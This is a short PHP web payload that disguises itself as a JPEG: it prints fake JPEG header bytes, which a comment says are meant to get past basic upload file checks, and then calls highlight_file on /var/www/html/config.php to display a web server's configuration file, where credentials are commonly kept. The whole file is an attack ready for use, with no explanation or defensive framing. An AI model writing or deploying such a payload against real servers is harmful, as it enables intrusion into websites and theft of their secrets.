<?php
/* Fake JPEG header to bypass basic file checks */
echo "\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x02";

// Start PHP payload
highlight_file('/var/www/html/config.php');
?>
